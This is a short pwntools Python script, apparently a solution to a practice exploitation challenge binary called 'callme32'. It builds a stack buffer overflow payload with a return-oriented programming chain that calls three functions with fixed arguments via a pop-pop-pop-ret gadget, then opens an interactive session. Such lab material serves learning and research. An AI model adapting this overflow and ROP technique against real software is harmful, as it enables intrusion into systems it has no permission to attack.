#!/usr/bin/python

from pwn import *

s = process('./callme32')
s.clean()

# 0x080485c0  callme_one@plt
callme_one = 0x080485c0

# 0x08048620  callme_two@plt
callme_two = 0x08048620

# 0x080485b0  callme_three@plt
callme_three = 0x080485b0

# 0x080488a9 : pop esi ; pop edi ; pop ebp ; ret
pop_pop_pop_ret = 0x080488a9

payload = 'A' * 44
payload += p32(callme_one)
payload += p32(pop_pop_pop_ret)
payload += p32(1)
payload += p32(2)
payload += p32(3)

payload += p32(callme_two)
payload += p32(pop_pop_pop_ret)
payload += p32(1)
payload += p32(2)
payload += p32(3)

payload += p32(callme_three)
payload += p32(0xdeadbeef)
payload += p32(1)
payload += p32(2)
payload += p32(3)

s.sendline(payload)

s.interactive()
